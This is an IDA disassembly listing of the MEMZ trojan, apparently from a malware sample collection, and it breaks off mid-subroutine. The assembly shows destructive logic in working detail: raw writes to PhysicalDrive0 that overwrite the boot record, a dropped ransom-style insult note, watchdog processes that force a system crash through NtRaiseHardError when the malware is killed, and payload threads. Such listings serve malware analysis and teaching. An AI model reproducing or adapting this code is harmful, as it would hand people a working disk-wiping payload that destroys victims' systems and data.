.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |            <error retrieving user info: Invalid input data>             |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 3FF64F10603F0330FA2386FF99471CA789391ACE969BD0EC1C1B8CE1B4A6DB42
.text:00401000 ; Input MD5    : A7BCF7EA8E9F3F36EBFB85B823E39D91
.text:00401000 ; Input CRC32  : EF5A59B2
.text:00401000 ; Compiler     : Visual C++ (guessed)
.text:00401000
.text:00401000 ; File Name   : /home/petik/Downloads/virusshare/Trojan.Win32.DiskWriter.bh/MEMZ.exe.bin
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 5BE181BC (Tue Nov 06 11:57:48 2018 UTC)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00000B08 (   2824.)
.text:00401000 ; Section size in file          : 00000C00 (   3072.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000 ; Attributes: bp-based frame
.text:00401000
.text:00401000 ; LRESULT __stdcall sub_401000(HWND, UINT, WPARAM, LPARAM)
.text:00401000 sub_401000      proc near               ; DATA XREF: start+72↓o
.text:00401000
.text:00401000 arg_4           = dword ptr  0Ch
.text:00401000
.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 cmp     [ebp+arg_4], 10h
.text:00401007                 jz      short loc_401016
.text:00401009                 cmp     [ebp+arg_4], 16h
.text:0040100D                 jz      short loc_401016
.text:0040100F                 pop     ebp
.text:00401010                 jmp     ds:DefWindowProcA ; USER32
.text:00401016 ; ---------------------------------------------------------------------------
.text:00401016
.text:00401016 loc_401016:                             ; CODE XREF: sub_401000+7↑j
.text:00401016                                         ; sub_401000+D↑j
.text:00401016                 call    sub_401021
.text:0040101B                 xor     eax, eax
.text:0040101D                 pop     ebp
.text:0040101E                 retn    10h
.text:0040101E sub_401000      endp
.text:0040101E
.text:00401021
.text:00401021 ; =============== S U B R O U T I N E =======================================
.text:00401021
.text:00401021
.text:00401021 ; BOOL __usercall sub_401021@<eax>(int@<ebp>)
.text:00401021 sub_401021      proc near               ; CODE XREF: sub_401000:loc_401016↑p
.text:00401021                                         ; sub_40114A+D4↓p
.text:00401021
.text:00401021 var_8           = dword ptr -8
.text:00401021 var_4           = dword ptr -4
.text:00401021
.text:00401021                 push    esi
.text:00401022                 push    edi
.text:00401023                 push    14h
.text:00401025                 pop     esi
.text:00401026                 xor     edi, edi
.text:00401028
.text:00401028 loc_401028:                             ; CODE XREF: sub_401021+26↓j
.text:00401028                 push    edi             ; lpThreadId
.text:00401029                 push    edi             ; dwCreationFlags
.text:0040102A                 push    edi             ; lpParameter
.text:0040102B                 push    offset StartAddress ; lpStartAddress
.text:00401030                 push    1000h           ; dwStackSize
.text:00401035                 push    edi             ; lpThreadAttributes
.text:00401036                 call    ds:CreateThread ; KERNEL32
.text:0040103C                 push    64h ; 'd'       ; dwMilliseconds
.text:0040103E                 call    ds:Sleep        ; KERNEL32
.text:00401044                 sub     esi, 1
.text:00401047                 jnz     short loc_401028
.text:00401049                 pop     edi
.text:0040104A                 pop     esi
.text:0040104B                 jmp     $+5
.text:00401050 ; ---------------------------------------------------------------------------
.text:00401050
.text:00401050 loc_401050:                             ; CODE XREF: sub_401021+2A↑j
.text:00401050                 push    ebp
.text:00401051                 mov     ebp, esp
.text:00401053                 sub     esp, 1Ch
.text:00401056                 push    ebx
.text:00401057                 push    esi
.text:00401058                 push    edi
.text:00401059                 push    offset LibFileName ; "ntdll"
.text:0040105E                 call    ds:LoadLibraryA ; KERNEL32
.text:00401064                 mov     esi, ds:GetProcAddress ; KERNEL32
.text:0040106A                 mov     edi, eax
.text:0040106C                 push    offset ProcName ; "RtlAdjustPrivilege"
.text:00401071                 push    edi             ; hModule
.text:00401072                 call    esi ; GetProcAddress ; KERNEL32
.text:00401074                 push    offset aNtraiseharderr ; "NtRaiseHardError"
.text:00401079                 push    edi             ; hModule
.text:0040107A                 mov     ebx, eax
.text:0040107C                 call    esi ; GetProcAddress ; KERNEL32
.text:0040107E                 xor     edi, edi
.text:00401080                 mov     esi, eax
.text:00401082                 test    ebx, ebx
.text:00401084                 jz      short loc_4010A8
.text:00401086                 test    esi, esi
.text:00401088                 jz      short loc_4010A8
.text:0040108A                 lea     eax, [ebp-1]
.text:0040108D                 push    eax
.text:0040108E                 push    edi
.text:0040108F                 push    1
.text:00401091                 push    13h
.text:00401093                 call    ebx
.text:00401095                 lea     eax, [ebp-0Ch]
.text:00401098                 push    eax
.text:00401099                 push    6
.text:0040109B                 push    edi
.text:0040109C                 push    edi
.text:0040109D                 push    edi
.text:0040109E                 push    0C0000022h
.text:004010A3                 call    esi
.text:004010A5                 add     esp, 28h
.text:004010A8
.text:004010A8 loc_4010A8:                             ; CODE XREF: sub_401021+63↑j
.text:004010A8                                         ; sub_401021+67↑j
.text:004010A8                 lea     eax, [ebp-8]
.text:004010AB                 push    eax             ; TokenHandle
.text:004010AC                 push    28h ; '('       ; DesiredAccess
.text:004010AE                 call    ds:GetCurrentProcess ; KERNEL32
.text:004010B4                 push    eax             ; ProcessHandle
.text:004010B5                 call    ds:OpenProcessToken ; ADVAPI32
.text:004010BB                 lea     eax, [ebp-18h]
.text:004010BE                 push    eax             ; lpLuid
.text:004010BF                 push    offset Name     ; "SeShutdownPrivilege"
.text:004010C4                 push    edi             ; lpSystemName
.text:004010C5                 call    ds:LookupPrivilegeValueA ; ADVAPI32
.text:004010CB                 push    edi             ; ReturnLength
.text:004010CC                 push    edi             ; PreviousState
.text:004010CD                 push    edi             ; BufferLength
.text:004010CE                 lea     eax, [ebp-1Ch]
.text:004010D1                 mov     dword ptr [ebp-1Ch], 1
.text:004010D8                 push    eax             ; NewState
.text:004010D9                 push    edi             ; DisableAllPrivileges
.text:004010DA                 push    dword ptr [ebp-8] ; TokenHandle
.text:004010DD                 mov     dword ptr [ebp-10h], 2
.text:004010E4                 call    ds:AdjustTokenPrivileges ; ADVAPI32
.text:004010EA                 push    10007h          ; dwReason
.text:004010EF                 push    6               ; uFlags
.text:004010F1                 call    ds:ExitWindowsEx ; USER32
.text:004010F7                 pop     edi
.text:004010F8                 pop     esi
.text:004010F9                 pop     ebx
.text:004010FA                 mov     esp, ebp
.text:004010FC                 pop     ebp
.text:004010FD                 retn
.text:004010FE ; ---------------------------------------------------------------------------
.text:004010FE
.text:004010FE ; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
.text:004010FE StartAddress:                           ; DATA XREF: sub_401021+A↑o
.text:004010FE                 push    esi
.text:004010FF                 call    ds:GetCurrentThreadId ; KERNEL32
.text:00401105                 push    eax             ; dwThreadId
.text:00401106                 push    0               ; hmod
.text:00401108                 push    offset fn       ; lpfn
.text:0040110D                 push    5               ; idHook
.text:0040110F                 call    ds:SetWindowsHookExA ; USER32
.text:00401115                 push    1010h           ; uType
.text:0040111A                 push    offset Caption  ; "MEMZ"
.text:0040111F                 mov     esi, eax
.text:00401121                 call    sub_401A37
.text:00401126                 xor     edx, edx
.text:00401128                 div     ds:dword_4021F4
.text:0040112E                 push    lpText[edx*4]   ; lpText
.text:00401135                 push    0               ; hWnd
.text:00401137                 call    ds:MessageBoxA  ; USER32
.text:0040113D                 push    esi             ; hhk
.text:0040113E                 call    ds:UnhookWindowsHookEx ; USER32
.text:00401144                 xor     eax, eax
.text:00401146                 pop     esi
.text:00401147                 retn    4
.text:00401147 sub_401021      endp ; sp-analysis failed
.text:00401147
.text:0040114A
.text:0040114A ; =============== S U B R O U T I N E =======================================
.text:0040114A
.text:0040114A ; Attributes: noreturn bp-based frame
.text:0040114A
.text:0040114A ; void __stdcall __noreturn sub_40114A(LPVOID lpThreadParameter)
.text:0040114A sub_40114A      proc near               ; DATA XREF: start+56↓o
.text:0040114A
.text:0040114A pe              = PROCESSENTRY32 ptr -138h
.text:0040114A lpString1       = dword ptr -10h
.text:0040114A var_C           = dword ptr -0Ch
.text:0040114A lpString2       = dword ptr -8
.text:0040114A hObject         = dword ptr -4
.text:0040114A lpThreadParameter= dword ptr  8
.text:0040114A
.text:0040114A                 push    ebp
.text:0040114B                 mov     ebp, esp
.text:0040114D                 sub     esp, 138h
.text:00401153                 push    ebx
.text:00401154                 push    esi
.text:00401155                 xor     ebx, ebx
.text:00401157                 push    edi
.text:00401158                 mov     [ebp+var_C], ebx
.text:0040115B                 mov     ebx, 200h
.text:00401160                 push    ebx             ; uBytes
.text:00401161                 push    40h ; '@'       ; uFlags
.text:00401163                 call    ds:LocalAlloc   ; KERNEL32
.text:00401169                 push    ebx
.text:0040116A                 push    eax
.text:0040116B                 mov     [ebp+lpString1], eax
.text:0040116E                 call    ds:GetCurrentProcess ; KERNEL32
.text:00401174                 push    eax
.text:00401175                 call    GetProcessImageFileNameA
.text:0040117A                 push    3E8h            ; dwMilliseconds
.text:0040117F
.text:0040117F loc_40117F:                             ; CODE XREF: sub_40114A+DE↓j
.text:0040117F                 call    ds:Sleep        ; KERNEL32
.text:00401185                 push    0               ; th32ProcessID
.text:00401187                 push    2               ; dwFlags
.text:00401189                 call    CreateToolhelp32Snapshot
.text:0040118E                 mov     edi, eax
.text:00401190                 mov     [ebp+pe.dwSize], 128h
.text:0040119A                 lea     eax, [ebp+pe]
.text:004011A0                 push    eax             ; lppe
.text:004011A1                 push    edi             ; hSnapshot
.text:004011A2                 call    Process32First
.text:004011A7                 mov     ebx, [ebp+lpString1]
.text:004011AA                 xor     esi, esi
.text:004011AC
.text:004011AC loc_4011AC:                             ; CODE XREF: sub_40114A+C6↓j
.text:004011AC                 push    [ebp+pe.th32ProcessID] ; dwProcessId
.text:004011B2                 push    0               ; bInheritHandle
.text:004011B4                 push    400h            ; dwDesiredAccess
.text:004011B9                 call    ds:OpenProcess  ; KERNEL32
.text:004011BF                 push    200h            ; uBytes
.text:004011C4                 push    40h ; '@'       ; uFlags
.text:004011C6                 mov     [ebp+hObject], eax
.text:004011C9                 call    ds:LocalAlloc   ; KERNEL32
.text:004011CF                 push    200h
.text:004011D4                 push    eax
.text:004011D5                 push    [ebp+hObject]
.text:004011D8                 mov     [ebp+lpString2], eax
.text:004011DB                 call    GetProcessImageFileNameA
.text:004011E0                 push    [ebp+lpString2] ; lpString2
.text:004011E3                 push    ebx             ; lpString1
.text:004011E4                 call    ds:lstrcmpA     ; KERNEL32
.text:004011EA                 test    eax, eax
.text:004011EC                 jnz     short loc_4011EF
.text:004011EE                 inc     esi
.text:004011EF
.text:004011EF loc_4011EF:                             ; CODE XREF: sub_40114A+A2↑j
.text:004011EF                 push    [ebp+hObject]   ; hObject
.text:004011F2                 call    ds:CloseHandle  ; KERNEL32
.text:004011F8                 push    [ebp+lpString2] ; hMem
.text:004011FB                 call    ds:LocalFree    ; KERNEL32
.text:00401201                 lea     eax, [ebp+pe]
.text:00401207                 push    eax             ; lppe
.text:00401208                 push    edi             ; hSnapshot
.text:00401209                 call    Process32Next
.text:0040120E                 test    eax, eax
.text:00401210                 jnz     short loc_4011AC
.text:00401212                 push    edi             ; hObject
.text:00401213                 call    ds:CloseHandle  ; KERNEL32
.text:00401219                 cmp     esi, [ebp+var_C]
.text:0040121C                 jge     short loc_401223
.text:0040121E                 call    sub_401021
.text:00401223
.text:00401223 loc_401223:                             ; CODE XREF: sub_40114A+D2↑j
.text:00401223                 mov     [ebp+var_C], esi
.text:00401226                 push    0Ah
.text:00401228                 jmp     loc_40117F
.text:00401228 sub_40114A      endp
.text:00401228
.text:0040122D
.text:0040122D ; =============== S U B R O U T I N E =======================================
.text:0040122D
.text:0040122D ; Attributes: noreturn bp-based frame
.text:0040122D
.text:0040122D                 public start
.text:0040122D start           proc near
.text:0040122D
.text:0040122D pExecInfo       = SHELLEXECUTEINFOA ptr -64h
.text:0040122D Msg             = MSG ptr -28h
.text:0040122D NumberOfBytesWritten= dword ptr -0Ch
.text:0040122D hObject         = dword ptr -8
.text:0040122D pNumArgs        = dword ptr -4
.text:0040122D
.text:0040122D                 push    ebp
.text:0040122E                 mov     ebp, esp
.text:00401230                 sub     esp, 64h
.text:00401233                 push    ebx
.text:00401234                 push    esi
.text:00401235                 mov     esi, ds:GetSystemMetrics ; USER32
.text:0040123B                 xor     ebx, ebx
.text:0040123D                 push    edi
.text:0040123E                 push    ebx             ; nIndex
.text:0040123F                 call    esi ; GetSystemMetrics ; USER32
.text:00401241                 push    1               ; nIndex
.text:00401243                 mov     dword_4040E4, eax
.text:00401248                 call    esi ; GetSystemMetrics ; USER32
.text:0040124A                 mov     dword_4040E8, eax
.text:0040124F                 lea     eax, [ebp+pNumArgs]
.text:00401252                 push    eax             ; pNumArgs
.text:00401253                 call    ds:GetCommandLineW ; KERNEL32
.text:00401259                 push    eax             ; lpCmdLine
.text:0040125A                 call    ds:CommandLineToArgvW ; SHELL32
.text:00401260                 cmp     [ebp+pNumArgs], 1
.text:00401264                 jle     loc_40144F
.text:0040126A                 push    offset String2  ; "/watchdog"
.text:0040126F                 push    dword ptr [eax+4] ; lpString1
.text:00401272                 call    ds:lstrcmpW     ; KERNEL32
.text:00401278                 test    eax, eax
.text:0040127A                 jnz     loc_401308
.text:00401280                 push    ebx             ; lpThreadId
.text:00401281                 push    ebx             ; dwCreationFlags
.text:00401282                 push    ebx             ; lpParameter
.text:00401283                 push    offset sub_40114A ; lpStartAddress
.text:00401288                 push    ebx             ; dwStackSize
.text:00401289                 push    ebx             ; lpThreadAttributes
.text:0040128A                 call    ds:CreateThread ; KERNEL32
.text:00401290                 lea     eax, [ebp+pExecInfo.lpVerb]
.text:00401293                 mov     [ebp+pExecInfo.lpVerb], 30h ; '0'
.text:0040129A                 mov     esi, offset ClassName ; "hax"
.text:0040129F                 mov     [ebp+pExecInfo.lpParameters], offset sub_401000
.text:004012A6                 push    eax             ; WNDCLASSEXA *
.text:004012A7                 mov     dword ptr [ebp+pExecInfo.34h], esi
.text:004012AA                 mov     [ebp+pExecInfo.lpFile], ebx
.text:004012AD                 mov     [ebp+pExecInfo.lpDirectory], ebx
.text:004012B0                 mov     [ebp+pExecInfo.nShow], ebx
.text:004012B3                 mov     [ebp+pExecInfo.hInstApp], ebx
.text:004012B6                 mov     [ebp+pExecInfo.lpIDList], ebx
.text:004012B9                 mov     [ebp+pExecInfo.lpClass], ebx
.text:004012BC                 mov     [ebp+pExecInfo.hkeyClass], ebx
.text:004012BF                 mov     [ebp+pExecInfo.dwHotKey], ebx
.text:004012C2                 mov     [ebp+pExecInfo.hProcess], ebx
.text:004012C5                 call    ds:RegisterClassExA ; USER32
.text:004012CB                 push    ebx             ; lpParam
.text:004012CC                 push    ebx             ; hInstance
.text:004012CD                 push    ebx             ; hMenu
.text:004012CE                 push    ebx             ; hWndParent
.text:004012CF                 push    64h ; 'd'       ; nHeight
.text:004012D1                 push    64h ; 'd'       ; nWidth
.text:004012D3                 push    ebx             ; Y
.text:004012D4                 push    ebx             ; X
.text:004012D5                 push    ebx             ; dwStyle
.text:004012D6                 push    ebx             ; lpWindowName
.text:004012D7                 push    esi             ; lpClassName
.text:004012D8                 push    ebx             ; dwExStyle
.text:004012D9                 call    ds:CreateWindowExA ; USER32
.text:004012DF                 mov     esi, ds:GetMessageA ; USER32
.text:004012E5                 jmp     short loc_4012FB
.text:004012E7 ; ---------------------------------------------------------------------------
.text:004012E7
.text:004012E7 loc_4012E7:                             ; CODE XREF: start+D9↓j
.text:004012E7                 lea     eax, [ebp+Msg]
.text:004012EA                 push    eax             ; lpMsg
.text:004012EB                 call    ds:TranslateMessage ; USER32
.text:004012F1                 lea     eax, [ebp+Msg]
.text:004012F4                 push    eax             ; lpMsg
.text:004012F5                 call    ds:DispatchMessageA ; USER32
.text:004012FB
.text:004012FB loc_4012FB:                             ; CODE XREF: start+B8↑j
.text:004012FB                 push    ebx             ; wMsgFilterMax
.text:004012FC                 push    ebx             ; wMsgFilterMin
.text:004012FD                 push    ebx             ; hWnd
.text:004012FE                 lea     eax, [ebp+Msg]
.text:00401301                 push    eax             ; lpMsg
.text:00401302                 call    esi ; GetMessageA ; USER32
.text:00401304                 test    eax, eax
.text:00401306                 jg      short loc_4012E7
.text:00401308
.text:00401308 loc_401308:                             ; CODE XREF: start+4D↑j
.text:00401308                 push    ebx             ; hTemplateFile
.text:00401309                 push    ebx             ; dwFlagsAndAttributes
.text:0040130A                 push    3               ; dwCreationDisposition
.text:0040130C                 push    ebx             ; lpSecurityAttributes
.text:0040130D                 push    3               ; dwShareMode
.text:0040130F                 push    0C0000000h      ; dwDesiredAccess
.text:00401314                 push    offset FileName ; "\\\\.\\PhysicalDrive0"
.text:00401319                 call    ds:CreateFileA  ; KERNEL32
.text:0040131F                 mov     ebx, eax
.text:00401321                 mov     [ebp+hObject], ebx
.text:00401324                 cmp     ebx, 0FFFFFFFFh
.text:00401327                 jnz     short loc_401331
.text:00401329                 push    2               ; uExitCode
.text:0040132B
.text:0040132B loc_40132B:                             ; CODE XREF: start+170↓j
.text:0040132B                                         ; start+1A3↓j ...
.text:0040132B                 call    ds:ExitProcess  ; KERNEL32
.text:00401331 ; ---------------------------------------------------------------------------
.text:00401331
.text:00401331 loc_401331:                             ; CODE XREF: start+FA↑j
.text:00401331                 push    10000h          ; uBytes
.text:00401336                 push    40h ; '@'       ; uFlags
.text:00401338                 call    ds:LocalAlloc   ; KERNEL32
.text:0040133E                 xor     edi, edi
.text:00401340                 mov     esi, eax
.text:00401342                 cmp     ds:dword_402AC8, edi
.text:00401348                 jbe     short loc_401362
.text:0040134A                 mov     edx, offset byte_4021F8
.text:0040134F                 mov     ecx, esi
.text:00401351                 sub     edx, esi
.text:00401353
.text:00401353 loc_401353:                             ; CODE XREF: start+133↓j
.text:00401353                 mov     al, [edx+ecx]
.text:00401356                 inc     edi
.text:00401357                 mov     [ecx], al
.text:00401359                 inc     ecx
.text:0040135A                 cmp     edi, ds:dword_402AC8
.text:00401360                 jb      short loc_401353
.text:00401362
.text:00401362 loc_401362:                             ; CODE XREF: start+11B↑j
.text:00401362                 xor     ecx, ecx
.text:00401364                 cmp     ds:dword_402ACC, ecx
.text:0040136A                 jbe     short loc_401382
.text:0040136C
.text:0040136C loc_40136C:                             ; CODE XREF: start+153↓j
.text:0040136C                 mov     al, ds:byte_402328[ecx]
.text:00401372                 mov     [esi+ecx+1FEh], al
.text:00401379                 inc     ecx
.text:0040137A                 cmp     ecx, ds:dword_402ACC
.text:00401380                 jb      short loc_40136C
.text:00401382
.text:00401382 loc_401382:                             ; CODE XREF: start+13D↑j
.text:00401382                 push    0               ; lpOverlapped
.text:00401384                 lea     eax, [ebp+NumberOfBytesWritten]
.text:00401387                 push    eax             ; lpNumberOfBytesWritten
.text:00401388                 push    10000h          ; nNumberOfBytesToWrite
.text:0040138D                 push    esi             ; lpBuffer
.text:0040138E                 push    ebx             ; hFile
.text:0040138F                 mov     ebx, ds:WriteFile ; KERNEL32
.text:00401395                 call    ebx ; WriteFile ; KERNEL32
.text:00401397                 test    eax, eax
.text:00401399                 jnz     short loc_40139F
.text:0040139B                 push    3
.text:0040139D                 jmp     short loc_40132B
.text:0040139F ; ---------------------------------------------------------------------------
.text:0040139F
.text:0040139F loc_40139F:                             ; CODE XREF: start+16C↑j
.text:0040139F                 push    [ebp+hObject]   ; hObject
.text:004013A2                 mov     edi, ds:CloseHandle ; KERNEL32
.text:004013A8                 call    edi ; CloseHandle ; KERNEL32
.text:004013AA                 push    0               ; hTemplateFile
.text:004013AC                 push    80h             ; dwFlagsAndAttributes
.text:004013B1                 push    2               ; dwCreationDisposition
.text:004013B3                 push    0               ; lpSecurityAttributes
.text:004013B5                 push    3               ; dwShareMode
.text:004013B7                 push    0C0000000h      ; dwDesiredAccess
.text:004013BC                 push    offset Parameters ; "\\note.txt"
.text:004013C1                 call    ds:CreateFileA  ; KERNEL32
.text:004013C7                 mov     esi, eax
.text:004013C9                 cmp     esi, 0FFFFFFFFh
.text:004013CC                 jnz     short loc_4013D5
.text:004013CE                 push    4
.text:004013D0                 jmp     loc_40132B
.text:004013D5 ; ---------------------------------------------------------------------------
.text:004013D5
.text:004013D5 loc_4013D5:                             ; CODE XREF: start+19F↑j
.text:004013D5                 push    0               ; lpOverlapped
.text:004013D7                 lea     eax, [ebp+NumberOfBytesWritten]
.text:004013DA                 push    eax             ; lpNumberOfBytesWritten
.text:004013DB                 push    ds:nNumberOfBytesToWrite ; nNumberOfBytesToWrite
.text:004013E1                 push    offset aYourComputerHa ; "YOUR COMPUTER HAS BEEN FUCKED BY THE ME"...
.text:004013E6                 push    esi             ; hFile
.text:004013E7                 call    ebx ; WriteFile ; KERNEL32
.text:004013E9                 test    eax, eax
.text:004013EB                 jnz     short loc_4013F4
.text:004013ED                 push    5
.text:004013EF                 jmp     loc_40132B
.text:004013F4 ; ---------------------------------------------------------------------------
.text:004013F4
.text:004013F4 loc_4013F4:                             ; CODE XREF: start+1BE↑j
.text:004013F4                 push    esi             ; hObject
.text:004013F5                 call    edi ; CloseHandle ; KERNEL32
.text:004013F7                 push    0Ah             ; nShowCmd
.text:004013F9                 xor     ebx, ebx
.text:004013FB                 push    ebx             ; lpDirectory
.text:004013FC                 push    offset Parameters ; "\\note.txt"
.text:00401401                 push    offset File     ; "notepad"
.text:00401406                 push    ebx             ; lpOperation
.text:00401407                 push    ebx             ; hwnd
.text:00401408                 call    ds:ShellExecuteA ; SHELL32
.text:0040140E                 mov     esi, ebx
.text:00401410                 mov     edi, ds:Sleep   ; KERNEL32
.text:00401416                 cmp     ds:dword_4033A8, ebx
.text:0040141C                 jbe     short loc_401446
.text:0040141E
.text:0040141E loc_40141E:                             ; CODE XREF: start+217↓j
.text:0040141E                 push    ds:dwMilliseconds[esi*8] ; dwMilliseconds
.text:00401425                 call    edi ; Sleep     ; KERNEL32
.text:00401427                 push    ebx             ; lpThreadId
.text:00401428                 push    ebx             ; dwCreationFlags
.text:00401429                 push    ds:lpParameter[esi*8] ; lpParameter
.text:00401430                 push    offset sub_401A0F ; lpStartAddress
.text:00401435                 push    ebx             ; dwStackSize
.text:00401436                 push    ebx             ; lpThreadAttributes
.text:00401437                 call    ds:CreateThread ; KERNEL32
.text:0040143D                 inc     esi
.text:0040143E                 cmp     esi, ds:dword_4033A8
.text:00401444                 jb      short loc_40141E
.text:00401446
.text:00401446 loc_401446:                             ; CODE XREF: start+1EF↑j
.text:00401446                                         ; start+220↓j
.text:00401446                 push    2710h           ; dwMilliseconds
.text:0040144B                 call    edi ; Sleep     ; KERNEL32
.text:0040144D                 jmp     short loc_401446
.text:0040144F ; ---------------------------------------------------------------------------
.text:0040144F
.text:0040144F loc_40144F:                             ; CODE XREF: start+37↑j
.text:0040144F                 mov     edi, 2000h
.text:00401454                 push    edi             ; uBytes
.text:00401455                 push    40h ; '@'       ; uFlags
.text:00401457                 call    ds:LocalAlloc   ; KERNEL32
.text:0040145D                 push    edi             ; nSize
.text:0040145E                 mov     esi, eax
.text:00401460                 push    esi             ; lpFilename
.text:00401461                 push    ebx             ; hModule
.text:00401462                 call    ds:GetModuleFileNameA ; KERNEL32
.text:00401468                 push    5
.text:0040146A                 pop     edi
.text:0040146B
.text:0040146B loc_40146B:                             ; CODE XREF: start+252↓j
.text:0040146B                 push    0Ah             ; nShowCmd
.text:0040146D                 push    ebx             ; lpDirectory
.text:0040146E                 push    offset aWatchdog_0 ; "/watchdog"
.text:00401473                 push    esi             ; lpFile
.text:00401474                 push    ebx             ; lpOperation
.text:00401475                 push    ebx             ; hwnd
.text:00401476                 call    ds:ShellExecuteA ; SHELL32
.text:0040147C                 sub     edi, 1
.text:0040147F                 jnz     short loc_40146B
.text:00401481                 lea     eax, [ebp+pExecInfo]
.text:00401484                 mov     [ebp+pExecInfo.cbSize], 3Ch ; '<'
.text:0040148B                 push    eax             ; pExecInfo
.text:0040148C                 mov     [ebp+pExecInfo.lpFile], esi
.text:0040148F                 mov     [ebp+pExecInfo.lpParameters], offset aMain ; "/main"
.text:00401496                 mov     [ebp+pExecInfo.fMask], 40h ; '@'
.text:0040149D                 mov     [ebp+pExecInfo.hwnd], ebx
.text:004014A0                 mov     [ebp+pExecInfo.lpVerb], ebx
.text:004014A3                 mov     [ebp+pExecInfo.lpDirectory], ebx
.text:004014A6                 mov     [ebp+pExecInfo.hInstApp], ebx
.text:004014A9                 mov     [ebp+pExecInfo.nShow], 0Ah
.text:004014B0                 call    ds:ShellExecuteExA ; SHELL32
.text:004014B6                 push    80h             ; dwPriorityClass
.text:004014BB                 push    [ebp+pExecInfo.hProcess] ; hProcess
.text:004014BE                 call    ds:SetPriorityClass ; KERNEL32
.text:004014C4                 push    ebx
.text:004014C5                 jmp     loc_40132B
.text:004014C5 start           endp
.text:004014C5
.text:004014CA
.text:004014CA ; =============== S U B R O U T I N E =======================================
.text:004014CA
.text:004014CA ; Attributes: bp-based frame
.text:004014CA
.text:004014CA ; int __cdecl sub_4014CA(int)
.text:004014CA sub_4014CA      proc near               ; DATA XREF: .rdata:lpParameter↓o
.text:004014CA
.text:004014CA var_4           = dword ptr -4
.text:004014CA arg_0           = dword ptr  8
.text:004014CA
.text:004014CA                 push    ebp
.text:004014CB                 mov     ebp, esp
.text:004014CD                 push    ecx
.text:004014CE                 push    ecx
.text:004014CF                 push    0Ah             ; nShowCmd
.text:004014D1                 push    0               ; lpDirectory
.text:004014D3                 push    0               ; lpParameters
.text:004014D5                 call    sub_401A37
.text:004014DA                 xor     edx, edx
.text:004014DC                 div     ds:dword_4021EC
.text:004014E2                 push    lpFile[edx*4]   ; lpFile
.text:004014E9                 push    offset Operation ; "open"
.text:004014EE                 push    0               ; hwnd
.text:004014F0                 call    ds:ShellExecuteA ; SHELL32
.text:004014F6                 call    sub_401A37
.text:004014FB                 cdq
.text:004014FC                 mov     ecx, 0C8h
.text:00401501                 idiv    ecx
.text:00401503                 mov     [ebp+var_4], edx
.text:00401506                 fild    [ebp+var_4]
.text:00401509                 fstp    qword ptr [ebp-8]
.text:0040150C                 fld     qword ptr [ebp-8]
.text:0040150F                 fild    [ebp+arg_0]
.text:00401512                 fstp    qword ptr [ebp-8]
.text:00401515                 fld     qword ptr [ebp-8]
.text:00401518                 fdiv    ds:dbl_403428
.text:0040151E                 fadd    ds:dbl_403400
.text:00401524                 fdivr   ds:dbl_403450
.text:0040152A                 fadd    ds:dbl_403438
.text:00401530                 faddp   st(1), st
.text:00401532                 call    sub_401AE6
.text:00401537                 mov     esp, ebp
.text:00401539                 pop     ebp
.text:0040153A                 retn
.text:0040153A sub_4014CA      endp
.text:0040153A
.text:0040153B
.text:0040153B ; =============== S U B R O U T I N E =======================================
.text:0040153B
.text:0040153B ; Attributes: bp-based frame
.text:0040153B
.text:0040153B ; int __cdecl sub_40153B(int, int)
.text:0040153B sub_40153B      proc near               ; DATA XREF: .rdata:00403360↓o
.text:0040153B
.text:0040153B Point           = tagPOINT ptr -8
.text:0040153B arg_4           = dword ptr  0Ch
.text:0040153B
.text:0040153B                 push    ebp
.text:0040153C                 mov     ebp, esp
.text:0040153E                 push    ecx
.text:0040153F                 push    ecx
.text:00401540                 push    ebx
.text:00401541                 push    esi
.text:00401542                 push    edi
.text:00401543                 lea     eax, [ebp+Point]
.text:00401546                 push    eax             ; lpPoint
.text:00401547                 call    ds:GetCursorPos ; USER32
.text:0040154D                 mov     eax, [ebp+arg_4]
.text:00401550                 mov     ecx, 898h
.text:00401555                 cdq
.text:00401556                 idiv    ecx
.text:00401558                 lea     esi, [eax+1]
.text:0040155B                 call    sub_401A37
.text:00401560                 cdq
.text:00401561                 idiv    esi
.text:00401563                 mov     edi, edx
.text:00401565                 call    sub_401A37
.text:0040156A                 cdq
.text:0040156B                 idiv    esi
.text:0040156D                 mov     esi, edx
.text:0040156F                 call    sub_401A37
.text:00401574                 push    3
.text:00401576                 cdq
.text:00401577                 pop     ebx
.text:00401578                 idiv    ebx
.text:0040157A                 dec     edx
.text:0040157B                 imul    edx, edi
.text:0040157E                 add     edx, [ebp+Point.y]
.text:00401581                 push    edx             ; Y
.text:00401582                 call    sub_401A37
.text:00401587                 cdq
.text:00401588                 idiv    ebx
.text:0040158A                 dec     edx
.text:0040158B                 imul    edx, esi
.text:0040158E                 add     edx, [ebp+Point.x]
.text:00401591                 push    edx             ; X
.text:00401592                 call    ds:SetCursorPos ; USER32
.text:00401598                 push    2
.text:0040159A                 pop     eax
.text:0040159B                 pop     edi
.text:0040159C                 pop     esi
.text:0040159D                 pop     ebx
.text:0040159E                 mov     esp, ebp
.text:004015A0                 pop     ebp
.text:004015A1                 retn
.text:004015A1 sub_40153B      endp
.text:004015A1
.text:004015A2
.text:004015A2 ; =============== S U B R O U T I N E =======================================
.text:004015A2
.text:004015A2 ; Attributes: bp-based frame
.text:004015A2
.text:004015A2 ; int sub_4015A2()
.text:004015A2 sub_4015A2      proc near               ; DATA XREF: .rdata:00403378↓o
.text:004015A2
